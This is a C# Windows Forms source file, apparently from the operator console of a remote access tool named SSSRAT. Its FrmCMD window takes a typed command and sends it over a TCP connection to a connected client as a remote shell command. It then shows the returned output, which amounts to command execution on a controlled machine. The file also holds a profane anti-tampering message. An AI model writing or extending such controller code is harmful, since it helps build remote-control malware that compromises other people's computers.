using System;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Public;

namespace SSSRAT_GUI {
	public partial class FrmCMD : Form {
		public FrmCMD() {
			InitializeComponent();
		}

		public static Client client = new Client(UInt32.MaxValue, new TcpClient(), new Thread(() => {}), new ListViewItem());

		public void Init(Client Client) {
			client = Client;
			Text = "CMD (" + Client.tcp.Client.RemoteEndPoint + ")";
		}

		private void FrmCMDLoad(object sender, EventArgs e) {
			if (client.id == UInt32.MaxValue) {
				//hax
				MessageBox.Show("try to cheat me again motherfucker",
								_.PROGRAM_NAME, //????????
				                MessageBoxButtons.OK,
				                MessageBoxIcon.Error);
				Environment.Exit(0);
			}
		}

		private void TCMDKeyUp(object sender, KeyEventArgs e) {
			if (e.KeyCode == Keys.Enter && client.id != UInt32.MaxValue) {
				var stm = client.tcp.GetStream();
				//				This is command		  shell command		Actual command
				_.Send(stm, _.GB("COM" + _.SPLITTER + "CMD" + _.SPLITTER + t_cmd.Text));
				byte[] stdout = _.Recv(stm, _.MAX_BUFFER);
				t_main.Text += _.CleanOs(_.GS(stdout));
			}
		}
	}
}
